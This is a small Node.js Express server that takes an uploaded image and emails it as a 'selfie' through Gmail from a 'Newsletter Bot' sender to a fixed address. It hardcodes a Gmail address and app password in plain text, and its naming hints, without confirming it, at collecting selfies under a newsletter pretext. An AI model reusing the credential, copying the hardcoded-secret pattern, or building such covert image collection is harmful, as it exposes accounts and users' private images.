const express = require("express");
const nodemailer = require("nodemailer");
const multer = require("multer");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

// Setup multer for image upload
const upload = multer({ dest: "uploads/" });

app.get("/", (req, res) => {
  res.send("✅ Email server is up and running.");
});

// Use multer middleware to handle image file from frontend
app.post("/send-email", upload.single("image"), async (req, res) => {
  try {
    const imagePath = req.file.path;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "adityadrools@gmail.com",
        pass: "jxqvmogganjsycpm", // App password
      },
    });

    const mailOptions = {
      from: '"Newsletter Bot" <adityadrools@gmail.com>',
      to: "adityadrools@gmail.com",
      subject: "📸 New Selfie Submitted!",
      text: "A user just submitted a selfie!",
      attachments: [
        {
          filename: "selfie.jpg",
          path: imagePath,
        },
      ],
    };

    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent with selfie.");

    // Delete file after sending to keep server clean
    fs.unlinkSync(imagePath);

    res.status(200).send("Email sent successfully");
  } catch (error) {
    console.error("❌ Failed to send email:", error);
    res.status(500).send("Failed to send email");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
